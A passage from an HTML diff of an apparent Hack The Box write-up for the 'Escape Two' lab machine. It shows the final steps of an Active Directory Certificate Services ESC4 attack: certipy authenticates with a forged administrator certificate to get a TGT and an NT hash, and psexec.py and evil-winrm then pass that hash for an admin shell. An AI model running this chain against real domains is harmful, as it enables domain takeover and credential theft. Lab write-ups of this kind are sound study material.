+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Certificate</span> <span class="n">has</span> <span class="n">no</span> <span class="nb">object</span> <span class="n">SID</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Saved</span> <span class="n">certificate</span> <span class="ow">and</span> <span class="n">private</span> <span class="n">key</span> <span class="n">to</span> <span class="s1">&#39;administrator_10.pfx&#39;</span>
+</pre></div>
+</div>
+</section>
+<section id="unpack-the-pfx-out-of-curiousity">
+<h3>Unpack the pfx out of curiousity<a class="headerlink" href="#unpack-the-pfx-out-of-curiousity" title="Permalink to this heading">#</a></h3>
+<p>A pfx is just a pkcs12 archive, so we can inspect the contents like so</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>openssl<span class="w"> </span>pkcs12<span class="w"> </span>-in<span class="w"> </span>administrator_10.pfx<span class="w"> </span>-nokeys<span class="w"> </span>-passin<span class="w"> </span>pass:<span class="s1">&#39;&#39;</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>openssl<span class="w"> </span>pkcs12<span class="w"> </span>-in<span class="w"> </span>administrator_10.pfx<span class="w"> </span>-nokeys<span class="w"> </span>-passin<span class="w"> </span>pass:<span class="s1">&#39;&#39;</span><span class="w"> </span><span class="p">|</span><span class="se">\</span>
+<span class="w">   </span>openssl<span class="w"> </span>x509<span class="w"> </span>-noout<span class="w"> </span>-text
+</pre></div>
+</div>
+<p>Indeed the SANs have the administrator as UPN</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>openssl<span class="w"> </span>pkcs12<span class="w"> </span>-in<span class="w"> </span>administrator_10.pfx<span class="w"> </span>-nokeys<span class="w"> </span>-passin<span class="w"> </span>pass:<span class="s1">&#39;&#39;</span><span class="w"> </span><span class="p">|</span><span class="se">\</span>
+<span class="w">   </span>openssl<span class="w"> </span>x509<span class="w"> </span>-noout<span class="w"> </span>-ext<span class="w"> </span>subjectAltName
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">X509v3</span> <span class="n">Subject</span> <span class="n">Alternative</span> <span class="n">Name</span><span class="p">:</span>
+    <span class="n">DNS</span><span class="p">:</span><span class="mf">10.10.11.51</span><span class="p">,</span> <span class="n">othername</span><span class="p">:</span> <span class="n">UPN</span><span class="p">:</span><span class="n">Administrator</span><span class="nd">@sequel</span><span class="o">.</span><span class="n">htb</span>
+</pre></div>
+</div>
+</section>
+<section id="use-the-x509-identity-to-get-admin-tgt">
+<h3>Use the x509 identity to get Admin TGT<a class="headerlink" href="#use-the-x509-identity-to-get-admin-tgt" title="Permalink to this heading">#</a></h3>
+<p>And we can now use certipy auth with that key and cert, and certipy does some more kerberos magic to eventually get us a TGT as Administrator</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>certipy<span class="w"> </span>auth<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-pfx<span class="w"> </span>administrator_10.pfx<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-username<span class="w"> </span>Administrator<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-domain<span class="w"> </span>sequel.htb
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Found</span> <span class="n">multiple</span> <span class="n">identifications</span> <span class="ow">in</span> <span class="n">certificate</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Please</span> <span class="n">select</span> <span class="n">one</span><span class="p">:</span>
+    <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="n">UPN</span><span class="p">:</span> <span class="s1">&#39;Administrator@sequel.htb&#39;</span>
+    <span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="n">DNS</span> <span class="n">Host</span> <span class="n">Name</span><span class="p">:</span> <span class="s1">&#39;10.10.11.51&#39;</span>
+<span class="o">&gt;</span> <span class="mi">0</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">principal</span><span class="p">:</span> <span class="n">administrator</span><span class="nd">@sequel</span><span class="o">.</span><span class="n">htb</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">get</span> <span class="n">TGT</span><span class="o">...</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">TGT</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Saved</span> <span class="n">credential</span> <span class="n">cache</span> <span class="n">to</span> <span class="s1">&#39;administrator.ccache&#39;</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">retrieve</span> <span class="n">NT</span> <span class="nb">hash</span> <span class="k">for</span> <span class="s1">&#39;administrator&#39;</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="nb">hash</span> <span class="k">for</span> <span class="s1">&#39;administrator@sequel.htb&#39;</span><span class="p">:</span> <span class="n">aad3xxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><span class="p">:</span><span class="mi">7</span><span class="n">a8d4e0xxxxxxxxxxxxxxxxxxxxx</span>
+</pre></div>
+</div>
+</section>
+<section id="use-the-administrator-s-tgt-with-psexec">
+<h3>Use the Administrator’s TGT with psexec<a class="headerlink" href="#use-the-administrator-s-tgt-with-psexec" title="Permalink to this heading">#</a></h3>
+<p>And finally we can pass the hash with psexec to get a shell as Administrator</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>psexec.py<span class="w"> </span>-hashes<span class="w"> </span>:7a8d4e0xxxxxxxxxxxxxxxxxxxxx<span class="w"> </span>Administrator@sequel.htb<span class="w"> </span>-codec<span class="w"> </span>gbk
+</pre></div>
+</div>
+<p>Or with evil-winrm</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="m">10</span>.10.11.51<span class="w"> </span>-u<span class="w"> </span>Administrator<span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;7a8d4e0xxxxxxxxxxxxxxxxxxxxx&#39;</span>
+</pre></div>
+</div>
+</section>
+</section>
+</section>
+
+        </article>
+      </div>
+      <footer>
+        
+        <div class="related-pages">
+          <a class="next-page" href="../inject/inject.html">
+              <div class="page-info">
+                <div class="context">
+                  <span>Next</span>
+                </div>
+                <div class="title">Inject</div>
+              </div>
+              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
+            </a>
+          <a class="prev-page" href="../dog/dog.html">
+              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
+              <div class="page-info">
+                <div class="context">
+                  <span>Previous</span>
+                </div>
+                
+                <div class="title">Dog</div>
+                
+              </div>
+            </a>
+        </div>
+        <div class="bottom-of-page">
+          <div class="left-details">
+            <div class="copyright">
+                Copyright &#169; 2023, blnkn
+            </div>
+            Made with <a href="https://www.sphinx-doc.org/">Sphinx</a> and <a class="muted-link" href="https://pradyunsg.me">@pradyunsg</a>'s
+            
+            <a href="https://github.com/pradyunsg/furo">Furo</a>
+            
+          </div>
+          <div class="right-details">
+            
+          </div>
+        </div>
+        
+      </footer>
+    </div>
+    <aside class="toc-drawer">
+      
+      
+      <div class="toc-sticky toc-scroll">
+        <div class="toc-title-container">
+          <span class="toc-title">
+            On this page
+          </span>
+        </div>
+        <div class="toc-tree-container">
+          <div class="toc-tree">
+            <ul>
+<li><a class="reference internal" href="#">Escape Two</a><ul>
+<li><a class="reference internal" href="#initial-enumeration">Initial Enumeration</a></li>
+<li><a class="reference internal" href="#enumerating-ldap">Enumerating LDAP</a></li>
+<li><a class="reference internal" href="#enumerating-smb">Enumerating SMB</a></li>
+<li><a class="reference internal" href="#password-leak-in-corrupted-xlsx">Password leak in corrupted xlsx</a></li>
+<li><a class="reference internal" href="#mssql-connecting">MSSQL - Connecting</a></li>
+<li><a class="reference internal" href="#mssql-xp-cmdshell">MSSQL - XP Cmdshell</a></li>
+<li><a class="reference internal" href="#mssql-powerjoker">MSSQL - PowerJoker</a></li>
+<li><a class="reference internal" href="#password-leak-from-the-db-config">Password leak from the DB config</a></li>
+<li><a class="reference internal" href="#spraying-the-new-password">Spraying the new password</a></li>
+<li><a class="reference internal" href="#playing-with-activedirectory">Playing with ActiveDirectory</a><ul>
+<li><a class="reference internal" href="#powershell-activedirectory-module-on-windows">Powershell ActiveDirectory Module (on Windows)</a></li>
+<li><a class="reference internal" href="#powerview-ps1-on-windows">PowerView.ps1 (On Windows)</a></li>
+<li><a class="reference internal" href="#powerview-py-linux">PowerView.py (Linux)</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#abusing-ryan-s-writeowner-over-ca-svc">Abusing ryan’s writeOwner over ca svc</a></li>
+<li><a class="reference internal" href="#genericall-change-password">GenericAll - Change password</a></li>
+<li><a class="reference internal" href="#genericall-shadow-credentials-with-certipy">GenericAll - Shadow Credentials with Certipy</a></li>
+<li><a class="reference internal" href="#genericall-shadow-credentials-with-pywhisker">GenericAll - Shadow Credentials with pyWhisker</a></li>
+<li><a class="reference internal" href="#adcs-esc4-exploitation-with-certipy">ADCS ESC4 exploitation with Certipy</a><ul>
+<li><a class="reference internal" href="#find-adcs-vulnerabilities">Find ADCS vulnerabilities</a></li>
+<li><a class="reference internal" href="#update-the-template">Update the template</a></li>
+<li><a class="reference internal" href="#issue-a-cert-with-the-updated-template">Issue a cert with the updated template</a></li>
+<li><a class="reference internal" href="#unpack-the-pfx-out-of-curiousity">Unpack the pfx out of curiousity</a></li>
+<li><a class="reference internal" href="#use-the-x509-identity-to-get-admin-tgt">Use the x509 identity to get Admin TGT</a></li>
+<li><a class="reference internal" href="#use-the-administrator-s-tgt-with-psexec">Use the Administrator’s TGT with psexec</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+      </div>
+      
+      
+    </aside>
+  </div>
+</div><script data-url_root="../../../../" id="documentation_options" src="../../../../_static/documentation_options.js?v=b3ba4146"></script>
+    <script src="../../../../_static/doctools.js?v=888ff710"></script>
+    <script src="../../../../_static/sphinx_highlight.js?v=4825356b"></script>
+    <script src="../../../../_static/scripts/furo.js?v=32e29ea5"></script>
+    </body>
+</html>
